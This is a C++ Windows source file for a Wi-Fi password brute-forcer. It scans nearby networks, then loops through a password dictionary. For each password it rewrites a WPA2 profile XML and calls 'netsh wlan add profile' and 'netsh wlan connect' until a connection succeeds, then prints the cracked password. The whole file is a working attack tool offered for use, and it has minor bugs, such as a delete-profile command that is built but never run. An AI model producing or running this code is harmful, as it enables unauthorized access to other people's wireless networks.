// brutef.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <thread>
#include <iostream>
#include <windows.h>
#include <wlanapi.h>
#include <vector>
#include <string>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <conio.h> 
#include <regex>
#include <map>
#include <cstdio> 

#pragma comment(lib, "wlanapi.lib")


void listWifiInfo() {
    DWORD dwMaxClient = 2; // Maximum number of clients supported
    DWORD dwCurVersion = 0;
    HANDLE hClient = NULL;
    WLAN_INTERFACE_INFO_LIST* pIfList = NULL;

    if (WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient) != ERROR_SUCCESS) {
        std::cerr << "WlanOpenHandle failed" << std::endl;
        return;
    }

    if (WlanEnumInterfaces(hClient, NULL, &pIfList) != ERROR_SUCCESS) {
        std::cerr << "WlanEnumInterfaces failed" << std::endl;
        WlanCloseHandle(hClient, NULL);
        return;
    }

    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        WLAN_AVAILABLE_NETWORK_LIST* pBssList = NULL;
        WLAN_AVAILABLE_NETWORK* pBssEntry = NULL;
        if (WlanGetAvailableNetworkList(hClient, &(pIfList->InterfaceInfo[i].InterfaceGuid),
            0, NULL, &pBssList) == ERROR_SUCCESS) {

            if (pBssList != NULL) {
                for (DWORD j = 0; j < pBssList->dwNumberOfItems; j++) {
                    pBssEntry = &(pBssList->Network[j]);
                    std::cout << "SSID: " << pBssEntry->dot11Ssid.ucSSID << std::endl;
                    std::cout << "Signal Strength: " << pBssEntry->wlanSignalQuality << std::endl;
                    std::cout << "Encryption Cipher: " << pBssEntry->dot11DefaultCipherAlgorithm << std::endl;
                    std::cout << "Encryption Type: " << pBssEntry->dot11DefaultAuthAlgorithm << std::endl;
                    std::cout << std::endl;
                }
                WlanFreeMemory(pBssList);
            }
            WlanFreeMemory(pIfList);
            WlanCloseHandle(hClient, NULL);
            return;
        }
    }
}


void writeXml(const std::string& filePath, const std::string& newName, const std::string& newHex, const std::string& newKey) {
    std::fstream file(filePath, std::ios::in | std::ios::out);

    if (!file.is_open()) {
        std::cerr << "Error opening file." << std::endl;
        return;
    }

    std::ostringstream fileContentStream;
    fileContentStream << file.rdbuf();
    std::string fileContent = fileContentStream.str();
    file.close();
    std::regex regex("<name>(.*?)<\\/name>");
    fileContent = std::regex_replace(fileContent, regex, "<name>" + newName + "</name>");
    std::regex regex2("<hex>(.*?)<\\/hex>");
    fileContent = std::regex_replace(fileContent, regex2, "<hex>" + newHex + "</hex>");
    std::regex regex3("<keyMaterial>(.*?)<\\/keyMaterial>");
    fileContent = std::regex_replace(fileContent, regex3, "<keyMaterial>" + newKey + "</keyMaterial>");
    std::ofstream outFile(filePath, std::ios::out | std::ios::trunc);

    if (!outFile.is_open()) {
        std::cerr << "Error opening file for writing." << std::endl;
        return;
    }

    outFile << fileContent;
    outFile.close();
}


std::string stringToHex(const std::string& input) {
    std::stringstream hexStream;
    hexStream << std::hex << std::setfill('0');

    for (const char& c : input) {
        hexStream << std::setw(2) << static_cast<int>(static_cast<unsigned char>(c));
    }

    return hexStream.str();
}

int isConnected() {

    system("netsh wlan show interfaces > D:\\interfaces.txt");// replace with path u want chứ lười quá

    std::ifstream wifiInterfaces("D:\\interfaces.txt");

    if (!wifiInterfaces.is_open()) {
        std::cerr << "Error opening interfaces.txt for reading." << std::endl;
        return -1;  // false
    }

    std::string line;
    while (std::getline(wifiInterfaces, line)) {
        if (line.find("State                  : connected") != std::string::npos) {
            wifiInterfaces.close();
            remove("D:\\interfaces.txt");
            
            return 1;  
        }
    }

    wifiInterfaces.close();
    remove("D:\\interfaces.txt");
    return 0;  // false
}

std::vector<std::string> readPasswdFile(std::string pathDict) {
    std::vector<std::string> list;
    std::ifstream inputFile(pathDict);

    // Check if the file is opened successfully
    if (!inputFile.is_open()) {
        std::cerr << "Error opening file." << std::endl;
        return list;  // Return an empty vector in case of an error
    }

    std::string line;
    while (std::getline(inputFile, line)) {
        list.push_back(line);
    }

    inputFile.close();
    return list;
}

int main()
{

    std::string option;
    std::string ssid, pathDict;
    std::string profilePath = "D:\\haha\\test\\brutef2\\WPA2PSKEAS.xml";
    bool passwordFound = false;
    while (true) {
        // Print options
        std::cout << "Type a number to:\n 1.Scan\n 2. Brute Force\n 3.Disconnect\n 4.Exit \n";

        // Get user input
        std::getline(std::cin, option);

        if (option == "1") {
            listWifiInfo();
        }
        else if (option == "3") {
            system("netsh wlan disconnect");
        }
        else if (option == "2") {
           
            // Get info from user
            std::cout << "Enter SSID: ";
            std::getline(std::cin, ssid);
            std::cout << "Enter path passwd dictionary: ";
            std::getline(std::cin, pathDict);
            std::cout << "SSID: " << ssid << std::endl;
            std::cout << "Path: " << pathDict << std::endl;

            // Print Trying...
            std::cout << "Trying... \n";
           /* std::string ssid = "405 D5 5G";
            std::string  pathDict = "D:\\haha\\test\\brutef2\\top100-vn-passwords.txt";*/
            // string to hex
            std::string hexstring = stringToHex(ssid);
            std::vector<std::string> listPassWord = readPasswdFile(pathDict);
          

            // Brute force loop
            for (std::string passwd : listPassWord) {
                writeXml(profilePath, ssid, hexstring, passwd);
                std::string commandline = "netsh wlan add profile filename = \""  + profilePath + "\"";
                //std::cout << commandline + "\n";
                system(commandline.c_str());

                std::string commandline2 = "netsh wlan connect name = \"" + ssid + "\"";
                //std::cout << commandline2 + "\n";
                system(commandline2.c_str());
               
                std::this_thread::sleep_for(std::chrono::seconds(3));

                // Check connection
                int isConn = isConnected();
                if (isConn == 1) {
                    std::cout << "Get password successfully" << std::endl;
                    std::cout << "Pass is: " << passwd << std::endl;
                    passwordFound = true;
                    break;
                }
                else {
                  // disconnect 
                    std::cout << "Get password unsuccessfully \n" << std::endl;
                    system("netsh wlan disconnect");
                    
                    std::string commandline3 = "netsh wlan delete profile name = \"" + ssid + "\"";
                    //std::cout << commandline3;
                    std::this_thread::sleep_for(std::chrono::seconds(2));
                    system(commandline2.c_str());
                    continue;
                }
               
            }
            if (!passwordFound) {
                std::cout << "Not found." << std::endl;
            }
        }
        else if (option == "4") {
            break; // Exit the loop and end the program
        }
        else {
            std::cout << "Invalid option. Please try again." << std::endl;
        }
    }

    return 0;
}
  
